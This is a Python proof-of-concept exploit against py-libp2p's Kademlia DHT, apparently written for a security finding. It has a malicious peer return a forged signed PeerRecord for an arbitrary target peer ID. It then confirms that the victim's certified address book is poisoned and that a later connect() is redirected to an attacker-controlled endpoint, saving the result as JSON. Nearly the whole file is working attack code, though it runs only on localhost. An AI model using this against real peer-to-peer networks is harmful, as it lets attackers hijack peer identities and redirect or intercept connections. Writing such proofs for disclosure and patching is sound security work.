from __future__ import annotations

import json
import socket

import multiaddr
import trio
import varint

from libp2p import generate_new_rsa_identity, new_host
from libp2p.kad_dht.common import PROTOCOL_ID as KAD_PROTOCOL_ID
from libp2p.kad_dht.kad_dht import DHTMode, KadDHT
from libp2p.kad_dht.pb.kademlia_pb2 import Message
from libp2p.peer.envelope import seal_record
from libp2p.peer.id import ID
from libp2p.peer.peer_record import PeerRecord
from libp2p.peer.peerinfo import PeerInfo
from libp2p.tools.anyio_service import background_trio_service

from common import find_free_port, write_json_artifact


async def read_varint_prefixed(stream) -> bytes:
    length_bytes = b""
    while True:
        byte = await stream.read(1)
        if not byte:
            raise RuntimeError("stream closed while reading varint")
        length_bytes += byte
        if byte[0] & 0x80 == 0:
            break
    length = varint.decode_bytes(length_bytes)
    data = b""
    remaining = length
    while remaining > 0:
        chunk = await stream.read(remaining)
        if not chunk:
            raise RuntimeError("stream closed while reading payload")
        data += chunk
        remaining -= len(chunk)
    return data


async def main() -> None:
    attacker_key = generate_new_rsa_identity()
    victim_key = generate_new_rsa_identity()
    target_key = generate_new_rsa_identity()

    attacker_host = new_host(key_pair=attacker_key)
    victim_host = new_host(key_pair=victim_key)

    attacker_port = find_free_port("tcp")
    attacker_listen = multiaddr.Multiaddr(f"/ip4/127.0.0.1/tcp/{attacker_port}")
    poisoned_port = find_free_port("tcp")
    attacker_record_addr = multiaddr.Multiaddr(f"/ip4/127.0.0.1/tcp/{poisoned_port}")

    target_peer_id = ID.from_pubkey(target_key.public_key)
    forged_record = PeerRecord(target_peer_id, [attacker_record_addr], seq=1337)
    forged_envelope = seal_record(forged_record, attacker_key.private_key)
    handler_event = trio.Event()
    poisoned_dial_event = trio.Event()
    poisoned_dial_observation: dict[str, object] = {}

    async def attacker_kad_handler(stream) -> None:
        _ = await read_varint_prefixed(stream)

        response = Message()
        response.type = Message.MessageType.FIND_NODE
        peer_proto = response.closerPeers.add()
        peer_proto.id = target_peer_id.to_bytes()
        peer_proto.addrs.append(attacker_record_addr.to_bytes())
        peer_proto.connection = Message.ConnectionType.CAN_CONNECT
        peer_proto.signedRecord = forged_envelope.marshal_envelope()

        response_bytes = response.SerializeToString()
        await stream.write(varint.encode(len(response_bytes)))
        await stream.write(response_bytes)
        await stream.close()
        handler_event.set()

    attacker_host.set_stream_handler(KAD_PROTOCOL_ID, attacker_kad_handler)

    async def poisoned_addr_sink(port: int) -> None:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("127.0.0.1", port))
            srv.listen(1)
            srv.settimeout(10)
            conn, addr = await trio.to_thread.run_sync(srv.accept)
        with conn:
            conn.settimeout(2)
            try:
                first_bytes = await trio.to_thread.run_sync(conn.recv, 64)
            except Exception:
                first_bytes = b""
            poisoned_dial_observation.update(
                {
                    "sink_accepted_connection": True,
                    "sink_remote_address": [addr[0], addr[1]],
                    "sink_first_bytes_len": len(first_bytes),
                    "sink_first_bytes_hex": first_bytes.hex(),
                }
            )
            poisoned_dial_event.set()

    async with attacker_host.run(listen_addrs=[attacker_listen]), victim_host.run(
        listen_addrs=[]
    ):
        attacker_info = PeerInfo(attacker_host.get_id(), [attacker_listen])
        async with trio.open_nursery() as nursery:
            nursery.start_soon(poisoned_addr_sink, poisoned_port)
            await victim_host.connect(attacker_info)

            dht = KadDHT(victim_host, DHTMode.CLIENT)
            victim_host.get_peerstore().add_addrs(
                attacker_host.get_id(), [attacker_listen], 3600
            )
            await dht.routing_table.add_peer(attacker_info)

            async with background_trio_service(dht):
                found = await dht.find_peer(target_peer_id)
                with trio.fail_after(5):
                    await handler_event.wait()

            try:
                await victim_host.connect(PeerInfo(target_peer_id, []))
            except Exception as exc:
                poisoned_dial_observation["victim_connect_error"] = str(exc)

            with trio.move_on_after(5):
                await poisoned_dial_event.wait()

            poisoned_dial_observation["victim_connect_reached_poisoned_addr"] = (
                poisoned_dial_event.is_set()
            )
            nursery.cancel_scope.cancel()

    poisoned_addrs = victim_host.get_peerstore().addrs(target_peer_id)
    stored_env = victim_host.get_peerstore().get_peer_record(target_peer_id)
    signer_peer_id = (
        str(ID.from_pubkey(stored_env.public_key)) if stored_env is not None else None
    )

    result = {
        "finding": "dht_signed_peerrecord_poisoning",
        "official_entrypoint": "KadDHT.find_peer() over /ipfs/kad/1.0.0",
        "attacker_peer_id": str(attacker_host.get_id()),
        "target_peer_id": str(target_peer_id),
        "victim_peer_id": str(victim_host.get_id()),
        "forged_record_addrs": [str(attacker_record_addr)],
        "find_peer_result": {
            "peer_id": str(found.peer_id) if found is not None else None,
            "addrs": [str(addr) for addr in found.addrs] if found is not None else [],
        },
        "victim_peerstore_addrs_for_target": [str(addr) for addr in poisoned_addrs],
        "stored_envelope_signer_peer_id": signer_peer_id,
        "stored_envelope_record_peer_id": str(target_peer_id),
        "signer_matches_record_peer_id": signer_peer_id == str(target_peer_id),
        "poisoned_dial_observation": poisoned_dial_observation,
        "impact": (
            "A forged signed PeerRecord for an arbitrary target peer ID was accepted "
            "through the official DHT find_peer path, poisoning the victim's "
            "certified address book so the target peer ID resolved to attacker-"
            "controlled addresses, and a later official host.connect() attempt was "
            "redirected to the poisoned endpoint."
        ),
    }
    write_json_artifact("result.json", result)
    print(json.dumps(result, indent=2, sort_keys=True))


if __name__ == "__main__":
    trio.run(main)
